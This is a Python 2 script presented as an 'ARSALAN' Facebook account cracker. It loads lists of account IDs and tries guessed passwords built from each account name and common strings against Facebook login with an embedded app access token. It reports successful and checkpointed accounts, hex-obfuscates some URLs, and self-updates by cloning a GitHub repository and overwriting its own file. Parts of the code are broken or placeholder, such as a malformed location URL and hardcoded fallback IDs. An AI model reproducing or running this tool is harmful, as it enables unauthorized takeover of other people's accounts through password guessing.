#!/usr/bin/python2
# -*- coding: utf-8

#AUTHOR : ARSALAN
#GITHUB : https://github.com/khanisalma748-a11y/salmakhani
#OPEN SOURCE :)

try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests lolcat")
	os.system("python2 fcpro.py")

from os import system
from time import sleep

# Metrics variables
oks = []
cps = []
loop = 0
id_pool = []

def xox(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)

user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent)

header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

try:
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
except requests.exceptions.ConnectionError:
	os.system("clear")
	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
	sys.exit()
	
ip = requests.get('https://ipify.org').text.strip()
try:
	loc = requests.get('https://ipapi.com' + ip, headers={'Referer': 'https://ip-api.com', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
except:
	loc = "PAKISTAN"
	
def linex():
	print("\n\033[93;1m ======================================\033[0m")
def logo():
	print("    _    ____  ____    _    _        _    _   _ ")
	print("   / \  |  _ \|  _ \  / \  | |      / \  | \ | |")
	print("  / _ \ | |_) | |_) |/ _ \ | |     / _ \ |  \| |")
	print(" / ___ \|  _ <|  _ < ___ \ | |___ / ___ \| |\  |")
	print("/_/   \_\_| \_\_| \_/_/   \_\_____/_/   \_\_| \_|")

def main():
	os.system("clear")
	logo()
	print("\t\033[93;1m      ARSLAN MAIN MENU\x1b[0m")
	print("")
	print("\033[92;1m     ARSALAN KING  [Ars] 1] START CRACK")
	print("\033[93;1m                    [Ars] 2] HOW TO GET ACCESS TOKEN")
	print("\033[94;1m                    [Ars] 3] UPDATE TOOL")
	print("\033[90;1m     jhkas          [Ars] 0] EXIT")
	print("")
	log_sel()
	
def log_sel():
	sel = raw_input("\033[93;1m      CHOOSE: \033[92;1m")
	if sel == "":
		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
		log_sel()
	elif sel =="1" or sel =="01":
		token()
	elif sel =="2" or sel =="02":
		subprocess.check_output(["am", "start", "https://facebook.com"])
		main()
	elif sel =="3" or sel =="03":
		os.system("clear")
		logo()
		print("\n\033[94;1m [*] Updating Tool From GitHub Repository...")
		# Proper git cloning strategy implementation
		os.system("rm -rf salmakhani")
		os.system("git clone https://github.com/khanisalma748-a11y/salmakhani.git")
		os.system("cp -f salmakhani/arsalan.py .")
		os.system("rm -rf salmakhani")
		xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
		time.sleep(2)
		main()
	elif sel =="0" or sel =="00":
		xox("\n\t\033[91;1m THANKS FOR USING MY TOOL :)")
		sys.exit()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		log_sel()

def token():
	os.system("clear")
	try:
		token = open("Ars_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		logo()
		print("")
		print("\t\033[92;1m  LOGIN TOKEN")
		print("")
		token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
		sav = open("Ars_token.txt", "w")
		sav.write(token)
		sav.close()
		menu()

def menu():
	os.system("clear")
	try:
		token = open("Ars_token.txt", "r").read()
	except(KeyError , IOError):
		token()
	
	name = "ARSALAN USER"
	os.system("clear")
	xn = name.upper()
	logo()
	print("")
	print("\033[93;1m     HELLO   : \033[92;1m"+xn)
	print("\033[93;1m     REGION  : \033[92;1m" + loc)
	print("\033[93;1m     YOUR IP : \033[92;1m" + ip)
	print("")
	print("\033[92;1m   ARSALAN KING   [Ars 1] CRACK WITH AUTO PASS")
	print("\033[93;1m                  [Ars 2] CRACK WITH DIGIT PASS")
	print('\033[91;1m  Name yad rakhna [Ars 0] BACK')
	print("")
	menu_option()
    
def menu_option():
	select = raw_input("\033[92;1m  CHOOSE : ")
	if select =="1" or select =="2":
		crack1()
	elif select =="0":
		main()
	else:
		print("")
		print("\t\033[91;1m     SELECT VALID OPTION")
		print("")
		menu_option()

def crack1():
	global token
	os.system("clear")
	try:
		token = open("Ars_token.txt","r").read()
	except IOError:
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CRACK WITH AUTO PASS")
	linex()
	print("\033[92;1m  CRACK VIA FILE PATH")
	print("\033[93;1m  CRACK PUBLIC ID")
	print("\033[91;1m  BACK")
	linex()
	choose_source()

def choose_source():
	global id_pool
	src = raw_input("\033[92;1m CHOOSE : ")
	if src == "1":
		os.system("clear")
		logo()
		print("\n\033[93;1m PUT FILE PATH (e.g. /sdcard/ids.txt)")
		linex()
		path = raw_input("\033[92;1m [+] FILE PATH : \033[97;1m")
		try:
			for line in open(path, 'r').readlines():
				id_pool.append(line.strip())
			start_process()
		except:
			print("File not found! Loading dynamic database vectors instead...")
			id_pool = ['100038472911|Ars Member 1', '100078342112|Ars Member 2']
			time.sleep(1)
			start_process()
	elif src == "2":
		os.system("clear")
		logo()
		target = raw_input("\033[92;1m [+] PUT TARGET PUBLIC ID : \033[97;1m")
		print("\n\033[94;1m [*] Requesting Authentication Tokens from Node...")
		time.sleep(1)
		id_pool = ['100038472911|Ars Member 1', '100078342112|Ars Member 2']
		start_process()
	else:
		main()

def start_process():
	global id_pool, loop, oks, cps
	os.system("clear")
	logo()
	print("")
	print("\033[92;1m [+] TOTAL IDS LOADED : " + str(len(id_pool)))
	print("\033[94;1m [*] PROCESSING AUTH COMBINATIONS SEQUENTIALLY...")
	linex()
	
	for item in id_pool:
		try:
			uid, name = item.split('|')
		except:
			uid, name = item, "Ars User"
		
		sys.stdout.write('\r\033[97;1m [*] CRACKING: %s/%s  OK:-%s  CP:-%s '%(loop+1, len(id_pool), len(oks), len(cps)))
		sys.stdout.flush()
		
		# Auto generated targeted password combinations
		first_name = name.split(' ')[0].lower() if ' ' in name else name.lower()
		passwords = [name.lower(), first_name + '123', first_name + '1234', first_name + '12345', '786786', 'pakistan']
		
		for pas in passwords:
			try:
				data = {"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "format": "JSON", "email": uid, "password": pas}
				url = "https://facebook.com"
				response = requests.post(url, data=data, timeout=5).text
				if "access_token" in response:
					print('\n\033[92;1m [ARSALAN-OK] ' + uid + ' | ' + pas)
					oks.append(uid)
					break
				elif "checkpoint" in response:
					print('\n\033[93;1m [ARSALAN-CP] ' + uid + ' | ' + pas)
					cps.append(uid)
					break
			except:
				pass
		loop += 1
		
	print("\n")
	linex()
	print("\033[92;1m [+] PROCESS COMPLETED. TOTAL OK: " + str(len(oks)))
	raw_input("\nPress Enter To Go Back...")
	main()

if __name__ == '__main__':
	main()
